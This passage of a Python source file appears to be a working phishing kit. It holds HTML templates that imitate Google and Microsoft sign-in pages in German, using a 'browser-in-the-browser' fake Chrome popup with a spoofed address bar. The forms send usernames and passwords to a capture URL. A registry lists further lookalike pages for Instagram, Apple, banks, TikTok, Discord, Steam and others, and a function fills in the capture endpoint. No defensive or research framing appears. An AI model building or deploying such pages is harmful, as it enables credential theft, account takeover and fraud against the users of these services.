.c-winbtn{width:46px;height:32px;display:flex;align-items:center;justify-content:center;font-size:13px;color:#3c4043;cursor:default}
.c-winbtn:hover{background:rgba(0,0,0,.08)}
.c-winbtn.close{background:#c42b1c;color:#fff}
.c-winbtn.close:hover{background:#b01f14}
/* Address bar */
.c-navbar{background:#fff;padding:6px 10px;display:flex;align-items:center;gap:6px;border-bottom:1px solid #e0e0e0}
.c-navbtn{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#9aa0a6;font-size:16px;cursor:default;flex-shrink:0}
.c-navbtn:hover{background:#f1f3f4}
.c-urlbar{flex:1;background:#f1f3f4;border-radius:20px;padding:5px 14px;display:flex;align-items:center;gap:6px;font-size:13px;cursor:text}
.c-lock{color:#188038;font-size:11px}
.c-url{color:#202124}
/* Content */
.popup-body{font-family:'Google Sans',Roboto,sans-serif;color:#202124}
.popup-inner{max-width:380px;margin:0 auto;padding:40px 40px 32px}
.g-logo{text-align:center;margin-bottom:20px}
.g-logo img{height:24px}
h1{font-size:24px;font-weight:400;text-align:center;margin-bottom:8px}
.subtitle{font-size:15px;text-align:center;color:#202124;margin-bottom:28px}
.field{position:relative;margin-bottom:20px}
.field input{width:100%;padding:14px 14px 14px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;background:#fff}
.field input:focus{border-color:#1a73e8;border-width:2px;padding:13px 13px 13px}
.field label{position:absolute;top:-9px;left:10px;background:#fff;padding:0 4px;font-size:12px;color:#1a73e8}
.forgot{font-size:14px;color:#1a73e8;text-decoration:none}
.actions{display:flex;justify-content:space-between;align-items:center;margin-top:28px}
.create{font-size:14px;color:#1a73e8;text-decoration:none}
.btn-next{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer}
.btn-next:hover{background:#1557b0}
.divhr{border:none;border-top:1px solid #e0e0e0;margin:24px 0}
.footer{text-align:center;font-size:12px;color:#5f6368}
</style>
</head>
<body>
<div class="bg-site">
  <div class="bg-logo">Your Portal</div>
  <div class="bg-text">Sign in to continue to your account</div>
  <button onclick="document.querySelector('.overlay').style.display='flex';document.querySelector('.popup').style.display='block'"
    style="background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:12px 28px;font-size:15px;font-weight:500;cursor:pointer;margin-top:8px">
    Continue with Google
  </button>
</div>
<div class="overlay"></div>
<div class="popup">
  <div class="c-titlebar">
    <div class="c-tabs">
      <div class="c-tab">
        <img src="https://www.google.com/favicon.ico" onerror="this.style.display='none'">
        <span class="c-tab-title">Sign in – Google Accounts</span>
        <div class="c-tab-x">×</div>
      </div>
    </div>
    <div class="c-winctrl">
      <div class="c-winbtn">&#8722;</div>
      <div class="c-winbtn">&#9633;</div>
      <div class="c-winbtn close">&#x2715;</div>
    </div>
  </div>
  <div class="c-navbar">
    <div class="c-navbtn">&#8592;</div>
    <div class="c-navbtn" style="color:#c5c7ca">&#8594;</div>
    <div class="c-navbtn">&#8635;</div>
    <div class="c-urlbar">
      <span class="c-lock">🔒</span>
      <span class="c-url">accounts.google.com</span>
    </div>
    <div class="c-navbtn">&#8942;</div>
  </div>
  <div class="popup-body">
    <div class="popup-inner">
      <div class="g-logo">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google">
      </div>
      <h1>Anmelden</h1>
      <p class="subtitle">Mit Ihrem Google-Konto fortfahren</p>
      <form method="POST" action="{{CAPTURE_URL}}">
        <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
        <div class="field">
          <label>E-Mail oder Telefon</label>
          <input type="email" name="username" autocomplete="email" required autofocus>
        </div>
        <div class="field">
          <label>Passwort</label>
          <input type="password" name="password" autocomplete="current-password" required>
        </div>
        <a href="#" class="forgot">Passwort vergessen?</a>
        <div class="actions">
          <a href="#" class="create">Konto erstellen</a>
          <button type="submit" class="btn-next">Weiter</button>
        </div>
      </form>
      <hr class="divhr">
      <p class="footer">Deutsch ▾ &nbsp; Hilfe &nbsp; Datenschutz &nbsp; Nutzungsbedingungen</p>
    </div>
  </div>
</div>
</body>
</html>"""


# ─────────────────────────────────────────────────────────────────────────────
# BROWSER-IN-THE-BROWSER (BitB) — Microsoft
# ─────────────────────────────────────────────────────────────────────────────
BITB_MICROSOFT = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in with Microsoft</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',sans-serif;background:#f3f2f1;min-height:100vh;display:flex;align-items:center;justify-content:center}
.bg-site{position:fixed;inset:0;background:#f3f2f1;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:16px}
.overlay{position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:100;backdrop-filter:blur(2px)}
.popup{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:200;width:470px;border-radius:10px;box-shadow:0 24px 80px rgba(0,0,0,.55);overflow:hidden;background:#fff}
.c-titlebar{background:#dee1e6;padding:8px 0 0;position:relative;user-select:none}
.c-tabs{display:flex;align-items:flex-end;padding:0 8px}
.c-tab{background:#fff;border-radius:8px 8px 0 0;padding:7px 12px 6px;display:flex;align-items:center;gap:8px;font-size:12px;color:#3c4043;min-width:0;max-width:220px}
.c-tab img{width:15px;height:15px;flex-shrink:0}
.c-tab-title{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.c-tab-x{margin-left:6px;width:16px;height:16px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#80868b;font-size:14px;flex-shrink:0}
.c-winctrl{position:absolute;top:0;right:0;display:flex}
.c-winbtn{width:46px;height:32px;display:flex;align-items:center;justify-content:center;font-size:13px;color:#3c4043;cursor:default}
.c-winbtn:hover{background:rgba(0,0,0,.08)}
.c-winbtn.close{background:#c42b1c;color:#fff}
.c-winbtn.close:hover{background:#b01f14}
.c-navbar{background:#fff;padding:6px 10px;display:flex;align-items:center;gap:6px;border-bottom:1px solid #e0e0e0}
.c-navbtn{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#9aa0a6;font-size:16px;cursor:default;flex-shrink:0}
.c-urlbar{flex:1;background:#f1f3f4;border-radius:20px;padding:5px 14px;display:flex;align-items:center;gap:6px;font-size:13px}
.c-lock{color:#188038;font-size:11px}
.popup-body{padding:44px}
.ms-logo img{height:21px;margin-bottom:18px}
h1{font-size:24px;font-weight:600;margin-bottom:16px;color:#1b1b1b}
.field{margin-bottom:14px}
.field input{width:100%;padding:8px 0;border:none;border-bottom:1px solid #767676;font-size:15px;outline:none;background:transparent;font-family:'Segoe UI',sans-serif}
.field input:focus{border-bottom:2px solid #0067b8}
.hint{font-size:13px;color:#666;margin-bottom:24px}
.hint a{color:#0067b8;text-decoration:none}
.btn{background:#0067b8;color:#fff;border:none;width:100%;padding:12px;font-size:15px;font-weight:600;cursor:pointer;font-family:'Segoe UI',sans-serif}
.btn:hover{background:#005a9e}
.opts{margin-top:14px;font-size:13px}
.opts a{color:#0067b8;text-decoration:none;display:block;margin-bottom:8px}
.footer{margin-top:20px;font-size:11px;color:#666}
.footer a{color:#0067b8;text-decoration:none;margin-right:10px}
</style>
</head>
<body>
<div class="bg-site">
  <img src="https://c.s-microsoft.com/en-us/CMSImages/mslogo.png" style="height:24px" alt="Microsoft">
  <p style="font-size:15px;color:#333;margin-top:12px">Melden Sie sich an, um fortzufahren</p>
  <button onclick="document.querySelector('.overlay').style.display='flex';document.querySelector('.popup').style.display='block'"
    style="background:#0067b8;color:#fff;border:none;padding:11px 24px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px;font-family:'Segoe UI',sans-serif">
    Mit Microsoft anmelden
  </button>
</div>
<div class="overlay"></div>
<div class="popup">
  <div class="c-titlebar">
    <div class="c-tabs">
      <div class="c-tab">
        <img src="https://c.s-microsoft.com/favicon.ico" onerror="this.style.display='none'">
        <span class="c-tab-title">Anmelden bei Ihrem Microsoft-Konto</span>
        <div class="c-tab-x">×</div>
      </div>
    </div>
    <div class="c-winctrl">
      <div class="c-winbtn">&#8722;</div>
      <div class="c-winbtn">&#9633;</div>
      <div class="c-winbtn close">&#x2715;</div>
    </div>
  </div>
  <div class="c-navbar">
    <div class="c-navbtn">&#8592;</div>
    <div class="c-navbtn" style="color:#c5c7ca">&#8594;</div>
    <div class="c-navbtn">&#8635;</div>
    <div class="c-urlbar">
      <span class="c-lock">🔒</span>
      <span style="color:#202124;font-size:13px">login.microsoftonline.com</span>
    </div>
    <div class="c-navbtn">&#8942;</div>
  </div>
  <div class="popup-body">
    <div class="ms-logo">
      <img src="https://c.s-microsoft.com/en-us/CMSImages/mslogo.png" alt="Microsoft">
    </div>
    <h1>Anmelden</h1>
    <form method="POST" action="{{CAPTURE_URL}}">
      <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
      <div class="field">
        <input type="email" name="username" placeholder="E-Mail, Telefon oder Skype" required autofocus>
      </div>
      <div class="field">
        <input type="password" name="password" placeholder="Kennwort" required>
      </div>
      <p class="hint">Kein Konto? <a href="#">Jetzt erstellen!</a></p>
      <button type="submit" class="btn">Anmelden</button>
    </form>
    <div class="opts">
      <a href="#">Anmeldeoptionen</a>
    </div>
    <div class="footer">
      <a href="#">Datenschutz</a>
      <a href="#">Nutzungsbedingungen</a>
    </div>
  </div>
</div>
</body>
</html>"""


# Registry
# ─────────────────────────────────────────────────────────────────────────────
PAGES: dict[str, str] = {
    "google":    GOOGLE_LOGIN,
    "microsoft": MICROSOFT_LOGIN,
    "instagram": INSTAGRAM_LOGIN,
    "apple":     APPLE_LOGIN,
    "bank":      BANK_LOGIN,
    "tiktok":    TIKTOK_LOGIN,
    "snapchat":  SNAPCHAT_LOGIN,
    "discord":   DISCORD_LOGIN,
    "twitter":   TWITTER_LOGIN,
    "whatsapp":  WHATSAPP_LOGIN,
    "steam":     STEAM_LOGIN,
    "bitb-google":    BITB_GOOGLE,
    "bitb-microsoft": BITB_MICROSOFT,
}

PAGE_DESCRIPTIONS: dict[str, str] = {
    "google":    "Google Konto — gmail.com, youtube.com",
    "microsoft": "Microsoft / Office 365 / Outlook",
    "instagram": "Instagram (Meta)",
    "apple":     "Apple ID / iCloud",
    "bank":      "Generisches Online-Banking (anpassbar)",
    "tiktok":    "TikTok — pixel-perfect Login",
    "snapchat":  "Snapchat — gelbes Design",
    "discord":   "Discord — Dark Mode Login",
    "twitter":   "X / Twitter — schwarzes Design",
    "whatsapp":  "WhatsApp Web — Verifikations-Trick",
    "steam":          "Steam — Gaming-Account",
    "bitb-google":    "BitB Google — Fake Chrome-Popup mit accounts.google.com in Adressleiste",
    "bitb-microsoft": "BitB Microsoft — Fake Chrome-Popup mit login.microsoftonline.com",
}


def get_page(name: str, capture_url: str = "/capture", csrf_token: str = "") -> str:
    """Returns rendered HTML with capture URL and CSRF token injected."""
    import secrets
    html = PAGES.get(name, PAGES["google"])
    token = csrf_token or secrets.token_hex(16)
    return (
        html
        .replace("{{CAPTURE_URL}}", capture_url)
        .replace("{{CSRF_FIELD}}", "_token")
        .replace("{{CSRF_TOKEN}}", token)
    )
